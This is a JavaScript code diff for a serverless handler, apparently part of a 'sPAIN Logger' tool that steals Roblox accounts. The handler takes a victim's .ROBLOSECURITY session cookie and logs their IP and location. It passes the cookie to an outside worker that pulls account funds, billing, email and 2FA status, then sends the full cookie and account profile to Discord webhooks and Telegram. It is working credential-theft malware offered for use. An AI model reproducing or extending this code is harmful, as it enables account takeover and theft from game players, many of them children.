@@ -5,6 +5,7 @@ const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhB
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 const CHECKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 const DISCORD_INV = 'https://discord.gg/5Q8XvgTpTT';
+const BASE_URL    = 'https://spain-tools.vercel.app';
 
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
@@ -36,7 +37,7 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-// ── Checker ───────────────────────────────────────────────────────────────────
+// ── Checker (holy-truth worker) ───────────────────────────────────────────────
 async function getAccInfo(cookie) {
   try {
     const r = await fetch(CHECKER_URL, {
@@ -141,13 +142,13 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  const ip    = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-  const now   = new Date().toISOString();
-  const pName = record.displayName || slug;
-  const isDH  = !!record.dualhookParent;
-  const cookie = findCookie(slots);
+  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+  const now    = new Date().toISOString();
+  const pName  = record.displayName || slug;
+  const isDH   = !!record.dualhookParent;
+  const cookie   = findCookie(slots);
 
-  // ── Webhook list ──────────────────────────────────────────────────────────
+  // Build webhook list
   let webhook1 = null;
   const webhook2 = record.webhook;
   if (isDH) {
@@ -158,7 +159,7 @@ export default async function handler(req, res) {
   }
   const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
 
-  // ── No cookie ─────────────────────────────────────────────────────────────
+  // ── No cookie ────────────────────────────────────────────────────────────────
   if (!cookie) {
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
@@ -166,7 +167,7 @@ export default async function handler(req, res) {
       content: '@everyone',
       embeds: [{
         title:       '⚠️ Wrong Cookie — Troll Detected',
-        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`,
+        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
         color:       0xff3333,
         fields: [
           { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
@@ -181,87 +182,105 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // ── Cookie found — fetch geo + account info in parallel ───────────────────
-  const [geo, info] = await Promise.all([getIpGeo(ip), getAccInfo(cookie)]);
+  // ── Cookie found — geo + checker run in parallel ──────────────────────────
+  const [geo, info] = await Promise.all([
+    getIpGeo(ip),
+    getAccInfo(cookie)
+  ]);
 
   const loc     = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp     = geo?.isp || 'Unknown';
   const country = geo?.country || 'Unknown';
   const cflag   = flag(country);
+  const nowStr  = now;
 
-  // ── All fields straight from worker top-level (worker now exports everything flat) ──
-  const username     = info?.username     || 'Unknown';
-  const displayName  = info?.displayName  || username;
-  const uid          = info?.userId       || info?.id || '';
-  const avatarUrl    = info?.avatarUrl    || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
-  const ageDays      = info?.ageDays      ?? 0;
-  const ageBracket   = info?.ageBracket   || '13+';
-  const isPremium    = info?.isPremium    ?? false;
-  const voiceChat    = info?.voiceChat    ?? false;
-  const robux        = info?.robux        ?? 0;
+  // ── Worker failed or invalid cookie ───────────────────────────────────────────
+  if (!info) {
+    await Promise.all(allWH.map(wh => discordSend(wh, {
+      content: '@everyone',
+      embeds: [{
+        title:       '⚠️ Invalid Cookie',
+        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
+        color:       0xff3333,
+        fields: [
+          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
+          { name: '📍 Location', value: loc,                   inline: true },
+          { name: '💀 Status',   value: 'Cookie expired or invalid', inline: true },
+          { name: '🕐 Time',      value: now,                   inline: false }
+        ],
+        footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
+      }]
+    })));
+    await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+    return res.status(200).json({ success: true });
+  }
+
+  // ── Pull all fields from checker response ─────────────────────────────────
+  const fa           = info?.fullAccount || info || {};
+  const username     = info?.username    || 'Unknown';
+  const displayName  = info?.displayName || username;
+  const uid          = info?.id          || info?.userId || '';
+  const avatarUrl    = fa.avatarUrl      || info?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
+  const ageDays      = fa.ageDays        ?? info?.ageDays      ?? 0;
+  const ageBracket   = info?.ageBracket  || '13+';
+  const robux        = fa.robux          ?? info?.robux        ?? 0;
   const pendingRobux = info?.pendingRobux ?? 0;
-  const rap          = info?.rap          ?? 0;
-  const limiteds     = info?.limitedsCount ?? 0;
-  const credit       = info?.credit       ?? 0;
-  const creditCurr   = info?.creditCurr   || 'USD';
-  const payCount     = info?.payCount     ?? 0;
-  const groupsOwned  = info?.groupsOwned  ?? 0;
+  const rap          = fa.rap            ?? info?.rap          ?? 0;
+  const limiteds     = fa.limiteds       ?? info?.limitedsCount ?? 0;
+  const credit       = fa.credit         ?? info?.credit       ?? 0;
+  const creditCurr   = fa.creditCurrency ?? info?.creditCurr   ?? 'USD';
+  const payCount     = info?.payCount    ?? 0;
+  const groupsOwned  = info?.groupsOwned ?? 0;
   const groupBalance = info?.groupBalance ?? 0;
   const groupPending = info?.groupPending ?? 0;
-  const emailDisplay = info?.emailDisplay || 'Not Set';
-  const has2FA       = info?.has2FA       || 'Disabled';
-  const hasHeadless  = info?.hasHeadless  ?? false;
-  const hasKorblox   = info?.hasKorblox   ?? false;
-  const hasValkyrie  = info?.hasValkyrie  ?? false;
-  const mm2          = info?.mm2          ?? 0;
-  const adoptMe      = info?.adoptMe      ?? 0;
-  const ps99         = info?.ps99         ?? 0;
-  const txDay        = info?.txDay        ?? 0;
-  const txWeek       = info?.txWeek       ?? 0;
-  const txMonth      = info?.txMonth      ?? 0;
-  const txYear       = info?.txYear       ?? 0;
-  const friends      = info?.friends      ?? 0;
+  const emailDisplay = fa.emailDisplay   ?? info?.emailDisplay ?? 'Not Set';
+  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? 'Disabled';
+  const mm2          = info?.mm2         ?? 0;
+  const adoptMe      = info?.adoptMe     ?? 0;
+  const ps99         = info?.ps99        ?? 0;
 
-  const emailSet      = emailDisplay !== 'Not Set';
+  // Email/2FA derived booleans
+  const emailSet      = !emailDisplay.includes('Not Set');
   const emailVerified = emailDisplay.includes('Verified') && !emailDisplay.includes('Unverified');
-  const twoFAon       = has2FA !== 'Disabled';
+  const twoFAon       = has2FA !== 'Disabled' && has2FA !== 'None';
 
-  // The cookie we send everywhere:
-  // if worker renewed it → use newCookie (already has WARN prefix, worker guarantees this)
-  // otherwise → use the original cookie the victim submitted
-  const activeCookie  = (info?.isDifferent && info?.newCookie) ? info.newCookie : cookie;
-  const cookieLabel   = (info?.isDifferent && info?.newCookie) ? '🔄 .ROBLOSECURITY (Renewed ✓)' : '🔐 .ROBLOSECURITY';
-  const cookieDisplay = activeCookie.length > 950 ? activeCookie.substring(0, 950) + '…' : activeCookie;
+  // Refresh link (unique per capture)
+  const refreshToken = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+  const refreshUrl   = `${BASE_URL}/r/${refreshToken}`;
+  const profileUrl   = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
 
-  const profileUrl = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
-  const descEmoji  = isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`;
-  const descLinks  = info
-    ? `[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`
-    : `[Discord Server](${DISCORD_INV})`;
+  // Description - dualhook vs normal
+  const descEmoji = isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`;
+  const descLinks = `[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})\n\n[Join Discord](${DISCORD_INV})`;
+  const description = `${descEmoji}\n\n${descLinks}`;
 
-  // ── Build embed ───────────────────────────────────────────────────────────
+  // Cookie display — trimmed for embed, full via chunked message
+  const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
+
+  // ── Build the rich embed ──────────────────────────────────────────────────
   const richEmbed = {
     title:       `🧑 ${displayName} ${ageBracket}`,
-    description: `${descEmoji}\n\n${descLinks}`,
+    description,
     color:       5793266,
     thumbnail:   { url: avatarUrl },
     fields: [
-      { name: '👤 Username',  value: `\`${username}\``,  inline: true },
-      { name: '🆔 User ID',   value: `\`${uid || 'N/A'}\``, inline: true },
-      { name: '👥 Friends',   value: `\`${fmt(friends)}\``,  inline: true },
+      {
+        name:   '👤 Username',
+        value:  `\`${username}\``,
+        inline: true
+      },
+      // PASSWORD FIELD REMOVED - no longer included
       {
         name:  '📊 Account Stats',
-        value: `\`Age:\` \`${fmt(ageDays)} Days\`\n\`Premium:\` ${isPremium ? '✅' : '❌'}\n\`Voice Chat:\` ${voiceChat ? '✅' : '❌'}`,
-        inline: false
+        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``
       },
       {
-        name:  '📍 Location',
-        value: `• \`Country:\` ${country} ${cflag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${isp}`,
-        inline: false
+        name:  '📍 Locations',
+        value: `• \`Account:\` ${country} ${cflag}\n• \`Victim:\` ${country} ${cflag}\n• \`IP:\` \`${ip}\`\n• \`ISP:\` ${isp}`
       },
       {
         name:   '💳 Billing',
-        value:  `Credit: ${fmt(credit)} ${creditCurr}\nPayments: ${payCount}\nPending: ${fmt(pendingRobux)}`,
+        value:  `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
         inline: true
       },
       {
@@ -271,55 +290,51 @@ export default async function handler(req, res) {
       },
       {
         name:   '⚙️ Settings',
-        value:  `Email: ${emailSet ? 'Set ✅' : 'Not Set ❌'}\nVerified: ${emailVerified ? 'Yes ✅' : 'No ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
+        value:  `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
         inline: true
       },
       {
-        name:   '💰 Robux',
-        value:  `Balance: ${fmt(robux)}\nRAP: ${fmt(rap)}\nLimiteds: ${limiteds}`,
+        name:   '💰 Account Funds',
+        value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
         inline: true
       },
       {
-        name:   '📈 Transactions',
-        value:  `Day: ${fmt(txDay)}\nWeek: ${fmt(txWeek)}\nMonth: ${fmt(txMonth)}\nYear: ${fmt(txYear)}`,
+        name:   '🛒 Purchases',
+        value:  `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,
         inline: true
       },
       {
-        name:   '🏆 Inventory',
-        value:  `Headless: ${hasHeadless ? '✅' : '❌'}\nKorblox: ${hasKorblox ? '✅' : '❌'}\nValkyrie: ${hasValkyrie ? '✅' : '❌'}`,
-        inline: true
+        name:  '🎮 Gamepasses Played',
+        value: `Pet Simulator 99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`
       },
       {
-        name:  '🎮 Gamepasses',
-        value: `Pet Sim 99 → ${fmt(ps99)} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${fmt(adoptMe)} ${adoptMe ? '✅' : '❌'}\nMurder Mystery 2 → ${fmt(mm2)} ${mm2 ? '✅' : '❌'}`,
-        inline: false
-      },
-      {
-        name:  cookieLabel,
-        value: `\`\`\`${cookieDisplay}\`\`\``,
-        inline: false
+        name:  '🔐 ROBLOSECURITY',
+        value: `\`\`\`${cookieDisplay}\`\`\``
       }
     ],
-    footer:    { text: `sPAIN Logger • ${pName} • ${now}` },
-    timestamp: now
+    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
+    timestamp: nowStr
   };
 
-  // ── Send ──────────────────────────────────────────────────────────────────
+  // ── Send to all webhooks ──────────────────────────────────────────────────
   await Promise.all(allWH.map(async wh => {
+    // Main rich embed
     await discordSend(wh, { content: '@everyone', embeds: [richEmbed] });
-    // Full active cookie — never truncated
-    await discordChunked(wh, activeCookie);
+
+    // Full cookie in chunked code block
+    await discordChunked(wh, cookie);
+
     // PowerShell if available
     if (info?.powershell) await discordChunked(wh, info.powershell);
   }));
 
   // ── Telegram ─────────────────────────────────────────────────────────────
   await tgSend([
-    `✅ <b>${username} — ${pName}</b>`,
+    `✅ <b>${username} ${ageBracket} — ${pName}</b>`,
     `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)}`,
-    `👥 Groups: ${groupsOwned} | Bal: ${fmt(groupBalance)}`,
+    `👥 Groups: ${groupsOwned} owned | Bal: ${fmt(groupBalance)}`,
     `📍 ${loc} | ${isp}`,
-    `🔄 Cookie: ${info?.isDifferent ? 'Renewed ✓' : 'Original'}`
+    `🔗 <a href="${profileUrl}">View Profile</a>`
   ].join('\n'));
 
   return res.status(200).json({ success: true });
